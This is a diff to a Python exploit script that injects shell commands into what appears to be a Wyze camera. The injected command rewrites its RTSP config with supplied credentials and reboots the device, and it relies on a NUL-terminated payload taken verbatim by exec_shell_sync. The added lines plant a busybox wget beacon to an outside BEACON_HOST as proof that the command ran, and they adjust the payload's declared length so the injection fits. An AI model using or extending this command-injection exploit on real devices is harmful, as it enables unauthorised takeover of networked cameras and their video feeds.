@@ -59,8 +59,14 @@ def build_command(user: str, realm: str, pwd: str) -> str:
     ha1 = hashlib.md5(f"{user}:{realm}:{pwd}".encode()).hexdigest()
     cfg = f'{{"username":"{user}","ha1":"{ha1}","mode":1}}'
     # single shell word chain, no quotes inside: the payload is NUL-terminated
-    # at 337 and `exec_shell_sync` takes it verbatim
-    return f"echo {cfg} >/configs/rtsp_config.json && reboot"
+    # at 337 and `exec_shell_sync` takes it verbatim.
+    # The beacon runs BEFORE the reboot — without it the only acknowledgement is
+    # K10003, which is the LOGIN ack, not command execution (measured 2026-11-09:
+    # fires "succeeded" for 20 min while nothing was written). A /fss-ran line in
+    # /tmp/fss_beacons.log is the execution proof, even if the camera then hangs.
+    return (f"echo {cfg} >/configs/rtsp_config.json"
+            f" && /bin/busybox wget -q -O /dev/null \"http://{BEACON_HOST}:8080/fss-ran?via=rtsp-enable\""
+            " 2>/dev/null; reboot")
 
 
 # --- Cycle 5: no-reboot, durable-first chain (FINISH-WYZE.md) -----------------
@@ -520,6 +526,10 @@ def main() -> int:
             a.declared = need
     else:
         cmd = build_command(a.user, a.realm, a.pwd).encode()
+        need = CMD_OFF + len(cmd) + 1
+        if a.declared < need:
+            print(f"declared {a.declared} < required {need} — raising to {need}")
+            a.declared = need
     print(f"cmd ({len(cmd)}B): {cmd.decode()}")
 
     if a.loop_watch:
